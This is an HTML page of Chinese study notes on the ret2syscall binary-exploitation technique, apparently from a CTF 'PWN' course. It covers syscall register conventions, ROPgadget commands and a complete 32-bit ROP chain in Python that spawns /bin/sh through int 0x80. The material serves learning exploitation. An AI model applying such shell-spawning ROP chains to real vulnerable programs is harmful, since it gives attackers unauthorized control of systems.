@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title># ret2syscall,ret2syscall</title>
+    <link rel="stylesheet" href="/assets/css/notes.min.css">
+</head>
+<body>
+    <div class="main-content-wrapper">
+        <main class="content">
+            <h1>ret2syscall</h1>
+<h2>1.系统调用约定</h2>
+<ul>
+<li>32位程序： eax 对应系统调用号， ebx 、ecx 、edx 、esi 、edi 、ebp 分别对应前6个参数。<code>int 0x80</code></li>
+<li>64位程序： rax 对应系统调用号， rdi 、rsi 、rdx 、r10 、r8  、r9  分别对应前6个参数。<code>syscall</code></li>
+</ul>
+<h2>2.32位</h2>
+<p><img src="/0101/PWN/栈溢出/assets/3.ret2syscall/image-20240812160324542.png" alt="image-20240812160324542"></p>
+<ul>
+<li>
+<p>eax = 0x0b=execute</p>
+</li>
+<li>
+<p>ebx = “/bin/sh”</p>
+</li>
+<li>
+<p>ecx = 0</p>
+</li>
+<li>
+<p>edx = 0</p>
+</li>
+<li>
+<p>等价于execve(“/bin/sh”,NULL,NULL)函数</p>
+</li>
+<li>
+<p><code>ROPgadget --binary pwn --only 'int'</code></p>
+</li>
+</ul>
+<h2>3.64位</h2>
+<p><img src="/0101/PWN/栈溢出/assets/3.ret2syscall/image-20240812160350723.png" alt="image-20240812160350723"></p>
+<ul>
+<li>rax = 0x3b</li>
+<li>rdi = “/bin/sh”</li>
+<li>rsi = 0x0</li>
+<li>rdx = 0x0</li>
+<li><code>ROPgadget --binary pwn | grep 'syscall'</code></li>
+</ul>
+<h2>4.tips</h2>
+<p>tips：可以借助<code>ROPgadget</code>的<code>--ropchain</code>自动生成rop链条</p>
+<p>pad处填充需要填充的字节，接下来就是按照四字节的大小将b’/bin/sh’读入内存中的位置，同时b’/bin/sh’后面还要填充成0</p>
+<p>然后ebx赋值成b’/bin/sh’的内存位置，而ecx和edx又正好赋值成b’/bin/sh’后面填充的0，再eax自增</p>
+<pre><code class="language-python">from struct import pack
+
+# Padding goes here
+p = b''
+
+p += pack('&lt;I', 0x0806f02a) # pop edx ; ret
+p += pack('&lt;I', 0x080ea060) # @ .data
+p += pack('&lt;I', 0x080b81c6) # pop eax ; ret
+p += b'/bin'
+p += pack('&lt;I', 0x080549db) # mov dword ptr [edx], eax ; ret
+p += pack('&lt;I', 0x0806f02a) # pop edx ; ret
+p += pack('&lt;I', 0x080ea064) # @ .data + 4
+p += pack('&lt;I', 0x080b81c6) # pop eax ; ret
+p += b'//sh'
+p += pack('&lt;I', 0x080549db) # mov dword ptr [edx], eax ; ret
+p += pack('&lt;I', 0x0806f02a) # pop edx ; ret
+p += pack('&lt;I', 0x080ea068) # @ .data + 8
+p += pack('&lt;I', 0x08049303) # xor eax, eax ; ret
+p += pack('&lt;I', 0x080549db) # mov dword ptr [edx], eax ; ret
+p += pack('&lt;I', 0x080481c9) # pop ebx ; ret
+p += pack('&lt;I', 0x080ea060) # @ .data
+p += pack('&lt;I', 0x080de955) # pop ecx ; ret
+p += pack('&lt;I', 0x080ea068) # @ .data + 8
+p += pack('&lt;I', 0x0806f02a) # pop edx ; ret
+p += pack('&lt;I', 0x080ea068) # @ .data + 8
+p += pack('&lt;I', 0x08049303) # xor eax, eax ; ret
+p += pack('&lt;I', 0x0807a86f) # inc eax ; ret
+p += pack('&lt;I', 0x0807a86f) # inc eax ; ret
+p += pack('&lt;I', 0x0807a86f) # inc eax ; ret
+p += pack('&lt;I', 0x0807a86f) # inc eax ; ret
+p += pack('&lt;I', 0x0807a86f) # inc eax ; ret
+p += pack('&lt;I', 0x0807a86f) # inc eax ; ret
+p += pack('&lt;I', 0x0807a86f) # inc eax ; ret
+p += pack('&lt;I', 0x0807a86f) # inc eax ; ret
+p += pack('&lt;I', 0x0807a86f) # inc eax ; ret
+p += pack('&lt;I', 0x0807a86f) # inc eax ; ret
+p += pack('&lt;I', 0x0807a86f) # inc eax ; ret
+p += pack('&lt;I', 0x0806cc25) # int 0x80
+</code></pre>
+
+        </main>
+    </div>
+</body>
+</html>
